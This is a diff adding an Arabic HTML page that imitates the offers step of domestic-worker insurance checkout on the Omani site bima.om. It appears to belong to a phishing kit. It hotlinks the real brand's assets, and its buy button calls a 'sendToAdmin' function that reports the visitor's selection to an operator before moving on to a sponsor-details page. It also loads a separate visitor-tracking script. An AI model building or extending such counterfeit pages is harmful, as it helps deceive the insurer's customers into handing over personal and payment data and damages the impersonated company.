@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>بيمة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="https://app.bima.om/assets/images/isc.png">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: #f8f9fa;
+      color: #333;
+      direction: rtl;
+    }
+
+    /* HEADER */
+    .header {
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+      padding: 10px 0;
+      position: relative;
+      z-index: 100;
+    }
+    .header .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .header .logo img {
+      height: 50px;
+    }
+    .header nav {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+    .header nav a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 15px;
+      position: relative;
+    }
+    .header nav .dropdown {
+      position: relative;
+      cursor: pointer;
+    }
+    .header nav .dropdown:hover .submenu {
+      display: block;
+    }
+    .header nav .dropdown-arrow {
+      font-size: 10px;
+      margin-right: 4px;
+    }
+    .submenu {
+      display: none;
+      position: absolute;
+      top: 100%;
+      right: 0;
+      background: #fff;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      border-radius: 8px;
+      min-width: 200px;
+      padding: 10px 0;
+      z-index: 200;
+    }
+    .submenu a {
+      display: block;
+      padding: 8px 20px;
+      color: #333;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .submenu a:hover {
+      background: #f0f0f0;
+    }
+    .header-icons {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header-icons a {
+      color: #555;
+      font-size: 20px;
+      text-decoration: none;
+    }
+
+    /* STEPPER */
+    .page-header {
+      background: linear-gradient(135deg, #e8f5e9 0%, #f1f8e9 50%, #fffde7 100%);
+      padding: 20px 0;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .page-header .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .page-title {
+      font-size: 28px;
+      font-weight: 700;
+      color: #4caf50;
+    }
+    .stepper {
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    .stepper-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      padding: 0 20px;
+    }
+    .stepper-item:not(:last-child)::before {
+      content: '';
+      position: absolute;
+      top: 15px;
+      left: -20px;
+      width: 40px;
+      height: 2px;
+      background: #ccc;
+    }
+    .stepper-circle {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 700;
+      border: 2px solid #ccc;
+      color: #999;
+      background: #fff;
+    }
+    .stepper-item.active .stepper-circle {
+      background: #4caf50;
+      border-color: #4caf50;
+      color: #fff;
+    }
+    .stepper-item.done .stepper-circle {
+      background: #4caf50;
+      border-color: #4caf50;
+      color: #fff;
+    }
+    .stepper-label {
+      font-size: 12px;
+      margin-top: 5px;
+      color: #666;
+    }
+
+    /* MAIN CONTENT */
+    .main-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px 15px;
+      display: flex;
+      gap: 20px;
+    }
+
+    /* SIDEBAR */
+    .sidebar {
+      width: 280px;
+      flex-shrink: 0;
+    }
+    .advanced-search {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+    .advanced-search h3 {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .advanced-search .subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 15px;
+    }
+    .company-filter {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .company-filter input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #4caf50;
+    }
+
+    /* OFFERS AREA */
+    .offers-area {
+      flex: 1;
+    }
+
+    /* INFO BAR */
+    .info-bar {
+      background: #fff;
+      border-radius: 8px;
+      padding: 12px 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+    .info-bar ul {
+      list-style: none;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 5px 20px;
+      justify-content: flex-end;
+    }
+    .info-bar li {
+      font-size: 14px;
+      color: #555;
+    }
+    .info-bar .label {
+      color: #999;
+    }
+
+    /* OFFER CARD */
+    .offer-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid #e8e8e8;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+    }
+    .offer-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .offer-logo {
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      border: 1px solid #eee;
+      object-fit: contain;
+    }
+    .offer-company-name {
+      font-size: 18px;
+      font-weight: 700;
+      color: #333;
+    }
+
+    /* BADGES */
+    .badges-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 15px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    .badge-item {
+      padding: 8px 16px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 13px;
+    }
+    .badge-item .badge-title {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 2px;
+    }
+    .badge-item .badge-value {
+      font-weight: 600;
+      color: #333;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      justify-content: center;
+    }
+    .badge-blue {
+      background: #f6f9fe;
+    }
+    .badge-yellow {
+      background: #fff3cd;
+    }
+    .offer-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-right: auto;
+    }
+    .offer-actions button {
+      background: none;
+      border: none;
+      color: #4caf50;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: 'Tajawal', sans-serif;
+      font-weight: 500;
+    }
+    .offer-actions .separator {
+      color: #ccc;
+    }
+
+    /* COVERS */
+    .covers-section {
+      display: flex;
+      gap: 20px;
+    }
+    .covers-list {
+      flex: 1;
+    }
+    .covers-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .cover-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 0;
+      font-size: 14px;
+    }
+    .cover-item .cover-name {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .cover-check {
+      color: #4caf50;
+      font-size: 18px;
+    }
+    .cover-amount {
+      font-weight: 700;
+      color: #333;
+    }
+
+    /* BUY BUTTON */
+    .buy-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-width: 140px;
+    }
+    .buy-btn {
+      background: #66bb6a;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 18px 35px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      font-family: 'Tajawal', sans-serif;
+      box-shadow: none;
+      transition: transform 0.2s;
+    }
+    .buy-btn:hover {
+      transform: translateY(-2px);
+    }
+    .buy-btn .price {
+      font-size: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
+    .buy-btn .buy-text {
+      font-size: 13px;
+      margin-top: 3px;
+    }
+    .omr-symbol {
+      width: 18px;
+      height: 14px;
+    }
+
+    /* PREVIOUS BUTTON */
+    .prev-btn {
+      background: linear-gradient(135deg, #66bb6a, #43a047);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 25px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Tajawal', sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 20px;
+    }
+
+    /* FOOTER */
+    .footer {
+      background: #222;
+      color: #fff;
+      padding: 20px 0;
+      margin-top: 40px;
+    }
+    .footer .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .footer nav a {
+      color: #ccc;
+      text-decoration: none;
+      margin-left: 20px;
+      font-size: 14px;
+    }
+    .footer .copyright {
+      font-size: 13px;
+      color: #999;
+    }
+
+    /* SVG Icons inline */
+    .icon-globe { width: 22px; height: 22px; }
+    .icon-headset { width: 22px; height: 22px; }
+
+    @media (max-width: 992px) {
+      .main-content { flex-direction: column; }
+      .sidebar { width: 100%; }
+      .covers-section { flex-direction: column; }
+      .page-header .container { flex-direction: column; gap: 15px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header class="header">
+    <div class="container">
+      <div class="logo">
+        <a href="https://app.bima.om/">
+          <img src="https://app.bima.om/assets/images/isc2.png" alt="bima logo">
+        </a>
+      </div>
+      <nav>
+        <a href="https://bima.om/">الصفحة الرئيسية</a>
+        <div class="dropdown">
+          <a href="javascript:void(0)">تأمين <span class="dropdown-arrow">&#9660;</span></a>
+          <div class="submenu">
+            <a href="https://bima.om/#MotorForm">تأمين المركبات</a>
+            <a href="https://bima.om/Insurance/Travel">تأمين السفر</a>
+            <a href="/insurance/domestic-form.html">العمالة المنزلية</a>
+            <a href="#">تأمين طبي</a>
+            <a href="#">تأمين القروض</a>
+            <a href="#">تأمين المنزل</a>
+            <a href="#">تأمين الأخطاء الطبية</a>
+          </div>
+        </div>
+        <a href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;">تتبع الطلب</a>
+      </nav>
+      <div class="header-icons">
+        <a href="javascript:void(0)" title="اللغة">
+          <svg class="icon-globe" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+        </a>
+        <a href="tel:+96879997797" title="اتصل بنا">
+          <svg class="icon-headset" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></svg>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <!-- STEPPER -->
+  <div class="page-header">
+    <div class="container">
+      <h1 class="page-title">تأمين العمالة المنزلية</h1>
+      <div class="stepper">
+        <div class="stepper-item done">
+          <div class="stepper-circle">1</div>
+          <span class="stepper-label">التفاصيل</span>
+        </div>
+        <div class="stepper-item active">
+          <div class="stepper-circle">2</div>
+          <span class="stepper-label">العروض</span>
+        </div>
+        <div class="stepper-item">
+          <div class="stepper-circle">3</div>
+          <span class="stepper-label">مراجعة</span>
+        </div>
+        <div class="stepper-item">
+          <div class="stepper-circle">4</div>
+          <span class="stepper-label">الدفع</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main-content">
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <div class="advanced-search">
+        <h3>بحث متقدم</h3>
+        <div class="subtitle">شركات التأمين</div>
+        <label class="company-filter">
+          <input type="checkbox" checked disabled>
+          <span>تكافل عمان</span>
+        </label>
+      </div>
+    </aside>
+
+    <!-- OFFERS -->
+    <div class="offers-area">
+      <!-- INFO BAR -->
+      <div class="info-bar">
+        <ul>
+          <li><span class="label">رقم الاتصال:</span> 98099878</li>
+          <li><span class="label">نوع الطلب:</span> العمالة المنزلية</li>
+          <li><span class="label">نوع التأمين:</span> التأمين على الحياة</li>
+          <li><span class="label">تاريخ ميلاد العامل:</span> 19/7/1997</li>
+        </ul>
+      </div>
+
+      <!-- OFFER CARD -->
+      <div class="offer-card">
+        <div class="offer-header">
+          <img class="offer-logo" src="https://app.bima.om/Upload/Shared/Reg/3276f28f-cf70-44d7-9209-88c47c63f866_thumb.jpg" alt="تكافل عمان">
+          <span class="offer-company-name">تكافل عمان</span>
+        </div>
+
+        <div class="badges-row">
+          <div class="badge-item badge-blue">
+            <div class="badge-title">وثيقة التأمين</div>
+            <div class="badge-value">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4caf50" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
+              فوري
+            </div>
+          </div>
+          <div class="badge-item badge-blue">
+            <div class="badge-title">الملاحق/الإضافات</div>
+            <div class="badge-value">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#4caf50" stroke-width="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
+              فوري
+            </div>
+          </div>
+          <div class="badge-item badge-yellow">
+            <div class="badge-title">مدة الوثيقة</div>
+            <div class="badge-value">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e65100" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+              Two Years
+            </div>
+          </div>
+
+          <div class="offer-actions">
+            <button>عرض المزيد</button>
+            <span class="separator">|</span>
+            <button>عرض السعر</button>
+          </div>
+        </div>
+
+        <div class="covers-section">
+          <div class="covers-list">
+            <div class="covers-title">يشمل التغطيات</div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                الوفاة بسبب حادث
+              </span>
+              <span class="cover-amount">5,000</span>
+            </div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                النفقات الطبية بسبب حادث
+              </span>
+              <span class="cover-amount">500</span>
+            </div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                العجز الجزئي الدائم بسبب حادث (حسب مقياس نسبة الإعاقة)
+              </span>
+              <span class="cover-amount">5,000</span>
+            </div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                تذكرة طيران في حالة العجز الكلي الدائم
+              </span>
+              <span class="cover-amount">150</span>
+            </div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                العجز الكلي الدائم بسبب حادث
+              </span>
+              <span class="cover-amount">5,000</span>
+            </div>
+            <div class="cover-item">
+              <span class="cover-name">
+                <svg class="cover-check" width="18" height="18" viewBox="0 0 24 24" fill="#4caf50"><path d="M19 3H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2zm-9 14l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                الوفاة لأي سبب (بخلاف الحوادث)
+              </span>
+              <span class="cover-amount">2,000</span>
+            </div>
+          </div>
+
+          <div class="buy-section">
+            <button class="buy-btn" onclick="if(window.sendToAdmin){var company=document.querySelector('.offer-company-name');var price=document.querySelector('.price');window.sendToAdmin({company:company?company.textContent.trim():'',amount:price?price.textContent.trim()+' ر.ع':'','الحالة':'تم الشراء'},'تأمين خدم المنازل - العروض');}window.location.href='/insurance/sponsor-details.html'">
+              <div class="price">
+                15
+                <img class="omr-symbol" src="https://app.bima.om/assets/icons/omr-symbol.svg" alt="ر.ع">
+              </div>
+              <div class="buy-text">إشترِ الآن</div>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- PREVIOUS BUTTON -->
+      <button class="prev-btn" onclick="window.location.href='/insurance/domestic-form.html'">
+        ← السابق
+      </button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      <span class="copyright">حقوق الطبع والنشر © 2026، جميع الحقوق محفوظة.</span>
+      <nav>
+        <a href="https://bima.om/">الرئيسية</a>
+        <a href="https://bima.om/Home/Terms">الشروط</a>
+        <a href="https://bima.om/Home/PrivacyPolicy">سياسة الخصوصية</a>
+        <a href="https://bima.om/Home/ContactUs">تواصل</a>
+      </nav>
+    </div>
+  </footer>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
